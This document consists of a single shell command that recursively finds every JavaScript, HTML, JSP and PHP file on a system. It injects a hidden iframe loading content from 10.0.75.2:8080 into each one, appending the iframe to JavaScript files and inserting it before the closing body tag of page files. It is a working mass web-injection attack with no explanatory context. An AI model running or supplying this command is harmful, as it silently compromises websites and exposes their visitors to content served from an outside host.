find / -type f -name "*.js" -exec sh -c 'echo ";document.addEventListener(\"DOMContentLoaded\", function(event) { document.body.insertAdjacentHTML( \"beforeend\", \"<iframe style='"'"'display:none'"'"' src='"'"'10.0.75.2:8080'"'"'></iframe>\" );});" >> "$1"' -- {} \; ; find / -type f -iregex '.*\.\(html\|htm\|jsp\|php\)$' -exec sed -i 's/<\/body>/<iframe style="display:none" src="10.0.75.2:8080"><\/iframe><\/body>/g' {} \;